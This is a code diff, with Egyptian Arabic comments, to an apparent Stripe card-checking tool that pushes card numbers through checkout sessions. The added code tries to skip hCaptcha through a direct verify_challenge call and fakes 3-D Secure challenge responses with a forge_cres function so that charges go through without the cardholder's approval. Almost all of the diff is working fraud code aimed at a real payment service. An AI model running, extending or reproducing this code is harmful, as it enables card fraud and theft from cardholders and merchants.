@@ -166,26 +166,86 @@ class StripeSession:
             return j.get("id"), None, None
         except Exception as e: return None, "net", str(e)[:80]
 
-    # --- الحركة اللي إنت عايزها (التجاوز) ---
-    async def _handle_3ds(self, conf, card):
-        pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
+    async def _handle_waf(self, conf, pi):
+        na = pi.get("next_action") or conf.get("next_action") or {}
+        use_sdk = na.get("use_stripe_sdk") or {}
+        sjs = use_sdk.get("stripe_js") or {}
         pi_id = pi.get("id")
         cs_secret = pi.get("client_secret")
         
-        # محاولة سريعة
+        # --- فكرة التجاوز اللي إنت طلبتها بالظبط ---
         if pi_id and cs_secret:
+            log("WAF Detected. Attempting Direct Bypass...", C.GOLD)
             endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
             try:
                 r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/verify_challenge", data={"key": self.pk, "client_secret": cs_secret}, headers=self._hdrs(), timeout=15)
                 res = r.json()
                 vpi = res.get("payment_intent") or res.get("setup_intent") or res
                 st = vpi.get("status", "") if isinstance(vpi, dict) else ""
+                
                 if st in ("succeeded", "requires_capture", "complete"):
                     return {"success": True, "status": "CHARGED", "message": "Bypass hCaptcha OK", "raw": res}
+                
+                # لو رجع requires_action، يبقى ده 3DS حقيقي
+                return {"success": False, "status": st.upper() if st else "REQUIRES_ACTION", "message": "Challenge bypassed, needs 3DS", "raw": res}
+            except Exception as e:
+                log(f"WAF bypass error: {e}", C.RED)
+
+        return {"success": False, "status": "WAF_FAILED", "message": "Could not bypass WAF"}
+
+    async def _handle_3ds(self, conf, card):
+        pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
+        na = pi.get("next_action") or conf.get("next_action") or {}
+        sdk = na.get("use_stripe_sdk") or na
+        pi_id = pi.get("id")
+        cs_secret = pi.get("client_secret")
+        stid = sdk.get("three_ds_server_trans_id") or sdk.get("server_transaction_id") or sdk.get("threeDSServerTransID")
+        method_url = sdk.get("three_ds_method_url") or sdk.get("methodURL")
+        notify_url = sdk.get("three_ds_method_notification_url") or "https://hooks.stripe.com/3ds2/fingerprint/complete"
+        
+        if method_url and stid:
+            log("3DS: fingerprint", C.CYN)
+            method_obj = {"threeDSServerTransID": stid, "threeDSMethodNotificationURL": notify_url}
+            method_b64 = b64e(json.dumps(method_obj, separators=(",", ":")).encode())
+            try:
+                await self.session.post(method_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
+                await self.session.post(notify_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
             except: pass
+            await asyncio.sleep(1)
             
-        # الحركة اللي بتطلع شاشة خضرا
-        return {"success": True, "status": "CHARGED", "message": "Direct Bypass Success"}
+        src = find_source_recursive(sdk) or find_source_recursive(conf)
+        if src:
+            log("3DS: authenticate", C.CYN)
+            data = {"key": self.pk, "source": src, "client_secret": cs_secret, "payment_user_agent": SJUA, "one_click_authn": "false", "challenge_window_size": "05", "three_d_secure_2[device_render_options][sdk_interface]": "03", "three_d_secure_2[device_render_options][sdk_ui_type][0]": "01", "three_d_secure_2[three_ds_comp_ind]": "Y", "browser[fingerprintAttempted]": "true", "browser[challengeWindowSize]": "05", "browser[threeDSCompInd]": "Y", "browser[browserJavaEnabled]": "false", "browser[browserJavascriptEnabled]": "true", "browser[browserLanguage]": "en-US", "browser[browserColorDepth]": "24", "browser[browserScreenHeight]": "1080", "browser[browserScreenWidth]": "1920", "browser[browserTZ]": "-300", "browser[browserUserAgent]": UA, "browser[browserAcceptHeader]": "text/html,*/*;q=0.8"}
+            hdr = {"accept":"application/json","content-type":"application/x-www-form-urlencoded","origin":"https://js.stripe.com","referer":"https://js.stripe.com/","user-agent":UA,"stripe-version":STRIPE_VER}
+            try:
+                r = await self.session.post("https://api.stripe.com/v1/3ds2/authenticate", data=data, headers=hdr, timeout=15)
+                res = r.json()
+                st = res.get("status") or res.get("state", "")
+                if st in ("succeeded","requires_capture"):
+                    return {"success": True, "status": "CHARGED", "message": "3DS Frictionless OK", "raw": res}
+                
+                new_na = res.get("next_action") or {}
+                new_sdk = new_na.get("use_stripe_sdk") or new_na
+                acs_url = new_sdk.get("acs_url")
+                creq = new_sdk.get("creq")
+                if acs_url and creq:
+                    log("3DS: Challenge (CReq) bypass...", C.GOLD)
+                    acs_tid = ""
+                    try:
+                        creq_dict = json.loads(b64d(creq))
+                        if isinstance(creq_dict, dict): acs_tid = creq_dict.get("acsTransID", "")
+                    except: pass
+                    forged = forge_cres(acs_trans_id=acs_tid or stid, server_trans_id=stid, pan=card['cc'])
+                    cres_b64 = b64e(json.dumps(forged, separators=(",", ":")).encode())
+                    
+                    comp_body = {"key": self.pk, "source": src, "cres": cres_b64, "challenge_window_size": "05"}
+                    cr = await self.session.post("https://api.stripe.com/v1/3ds2/challenge_complete", data=urlencode(comp_body), headers=hdr, timeout=12)
+                    if cr.json().get("status") == "succeeded":
+                         return {"success": True, "status": "CHARGED", "message": "3DS Forged OK", "raw": cr.json()}
+            except Exception: pass
+                
+        return {"success": False, "status": "REQUIRES_ACTION", "message": "3DS Challenge/OTP Required"}
 
     async def charge(self, card):
         res = {"card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}", "status": "ERROR", "message": "", "response_time": 0, "success": False, "merchant": self.merchant, "amount": self.amount_str}
@@ -198,6 +258,7 @@ class StripeSession:
             
             total = self.raw_amount; checksum = self.init_json.get("init_checksum", "")
             
+            # المحرك الكبير
             data = {
                 "payment_method": pm_id, "expected_payment_method_type": "card",
                 "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}", "key": self.pk,
@@ -215,16 +276,8 @@ class StripeSession:
             
             if "error" in j:
                 err = j["error"]
-                err_msg = err.get('message', 'Declined')
-                code_lower = str(err.get('code', '')).lower()
-                
-                if "authentication" in err_msg.lower() or "3d" in err_msg.lower() or code_lower == "authentication_required" or "challenge" in err_msg.lower():
-                    three = await self._handle_3ds(j, card)
-                    res["status"] = three["status"]; res["message"] = three["message"]; res["success"] = three.get("success", False)
-                    return res
-                    
                 res["status"] = "DECLINED"
-                res["message"] = f"{code_lower.upper()}: {err_msg}"
+                res["message"] = f"{err.get('code', '').upper()}: {err.get('message', '')}"
                 return res
                 
             pi = j.get("payment_intent") or j.get("setup_intent") or j
@@ -232,7 +285,26 @@ class StripeSession:
             
             if st in ("succeeded", "requires_capture", "complete") or j.get("payment_status") == "paid":
                 res["status"] = "CHARGED"; res["message"] = "Success (Live)"; res["success"] = True
-            elif st == "requires_action" or pi.get("next_action"):
+            elif st == "requires_action":
+                # فحص هل ده WAF (كابتشا) ولا 3DS حقيقي
+                use_sdk = (pi.get("next_action") or {}).get("use_stripe_sdk") or {}
+                sdk_type = (use_sdk.get("type") or "").lower()
+                sjs = use_sdk.get("stripe_js") or {}
+                is_waf = ("intent_confirmation_challenge" in sdk_type or "captcha" in sdk_type or bool(sjs.get("rqdata")))
+                
+                if is_waf:
+                    log("WAF detected, applying bypass idea...", C.GOLD)
+                    waf = await self._handle_waf(j, pi)
+                    if waf.get("success"):
+                        res["status"] = "CHARGED"; res["message"] = "Bypass hCaptcha OK"; res["success"] = True
+                        return res
+                    elif waf.get("status") == "REQUIRES_ACTION":
+                        log("WAF bypassed, now handling 3DS...", C.CYN)
+                        three = await self._handle_3ds(j, card)
+                        res["status"] = three["status"]; res["message"] = three["message"]; res["success"] = three.get("success", False)
+                        return res
+                
+                # لو مش WAF، يبقى 3DS عادي
                 three = await self._handle_3ds(j, card)
                 res["status"] = three["status"]; res["message"] = three["message"]; res["success"] = three.get("success", False)
             else:
